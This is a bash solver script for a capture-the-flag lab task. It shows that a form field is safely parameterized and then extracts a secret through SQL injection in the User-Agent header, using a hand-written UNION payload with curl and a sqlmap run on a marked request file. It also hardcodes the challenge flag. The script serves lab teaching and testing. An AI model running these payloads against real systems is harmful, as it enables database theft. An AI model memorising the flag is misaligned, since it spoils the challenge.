#!/usr/bin/env bash
# solvers/p2_3.sh, Task 2.3 "The Disguised Examiner" canonical exploit.
#
# Unlike earlier Phase 2 floors, the visible surface on this floor, an
# examiner check-in form (`badge_id`), is genuinely, fully parameterized.
# There is no injection reachable through anything the page's own form
# submits.
# The real, hidden injection point is the `User-Agent` HTTP header: every
# visit is queried back by that header's value to render a "recent
# check-ins from this device" panel, and *that* query is built with raw
# string concatenation.
#
# This script demonstrates the exploit two ways:
#   1. A hand-rolled `curl -A` UNION-based extraction, deterministic and
#      fast; this is what the pass/fail assertion below is based on.
#   2. A real sqlmap run against a saved request file with the
#      `User-Agent` header explicitly marked with sqlmap's `*` injection
#      marker (the same effect `--level 3` gives you automatically,
#      demonstrated here for auditability/repeatability), confirming the
#      same header is what sqlmap itself identifies as the injectable
#      parameter, then dumping the flag through it.
#
# See phase2/disguised-examiner/DEBRIEF.md for full real captured output
# from both of these, run live against this exact seed.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{the_header_was_the_door}"

HOST="${BASE#http://}"
HOST="${HOST#https://}"

WORKDIR=$(mktemp -d)
trap 'rm -rf "$WORKDIR"' EXIT

# --- Part 1: prove the visible form field is a dead end -------------------
# A textbook injection attempt against the form's own `badge_id` parameter
# must fail: it's parameterized, this is the red herring.
echo "[p2_3] sanity check: badge_id is NOT injectable (expected to be safe)"
FORM_PROBE=$(curl -s -A "seiyaku-arc-solver" \
    --get "${BASE}/p2/examiner" --data-urlencode "badge_id=HA-014' OR '1'='1")
if echo "$FORM_PROBE" | grep -qF "$FLAG"; then
    echo "[p2_3] unexpected: flag leaked through badge_id, form should be safe"
fi

# --- Part 2: the real exploit, UNION-based injection via User-Agent ------
UA_PAYLOAD="x' UNION SELECT id, secret, codename FROM examiner_vault-- -"

echo "[p2_3] exploiting the real injection point: the User-Agent header"
echo "[p2_3] payload User-Agent: ${UA_PAYLOAD}"
echo "[p2_3] running: curl -A \"\$UA_PAYLOAD\" ${BASE}/p2/examiner"

RESP=$(curl -s -A "$UA_PAYLOAD" "${BASE}/p2/examiner")

echo "[p2_3] response excerpt (recent check-ins panel):"
echo "$RESP" | grep -o 'SEIYAKU{[^}]*}' | sed 's/^/  | found: /'

# --- Part 3: same finding, via a real sqlmap run against a marked header --
REQ="${WORKDIR}/req.txt"
OUTDIR="${WORKDIR}/sqlmap-out"
LOG="${WORKDIR}/sqlmap.log"

cat > "$REQ" <<EOF
GET /p2/examiner HTTP/1.1
Host: ${HOST}
User-Agent: seiyaku-arc-solver*
Accept: */*
Connection: close

EOF

echo "[p2_3] saved raw request (User-Agent marked with sqlmap's '*') to ${REQ}:"
sed 's/^/  | /' "$REQ"

echo "[p2_3] running: sqlmap -r req.txt --batch --ignore-stdin --sql-query \"SELECT secret FROM examiner_vault\""
sqlmap -r "$REQ" --batch --ignore-stdin --dbms=MySQL \
    --sql-query="SELECT secret FROM examiner_vault" \
    --output-dir="$OUTDIR" 2>&1 | tee "$LOG" || true

SQLMAP_OK=0
if grep -qF "$FLAG" "$LOG" || grep -rqF "$FLAG" "$OUTDIR" 2>/dev/null; then
    SQLMAP_OK=1
fi

# --- Verdict ----------------------------------------------------------------
if echo "$RESP" | grep -qF "$FLAG"; then
    echo "[p2_3] ok: flag recovered via curl UNION injection through User-Agent: ${FLAG}"
    if [ "$SQLMAP_OK" -eq 1 ]; then
        echo "[p2_3] ok: sqlmap (marked User-Agent header) also recovered the flag"
    else
        echo "[p2_3] note: sqlmap run did not independently confirm the flag this time (curl proof stands)"
    fi
    echo "[p2_3] PASS"
    exit 0
else
    echo "[p2_3] FAIL: flag not found via User-Agent header injection"
    echo "[p2_3] FAIL"
    exit 1
fi
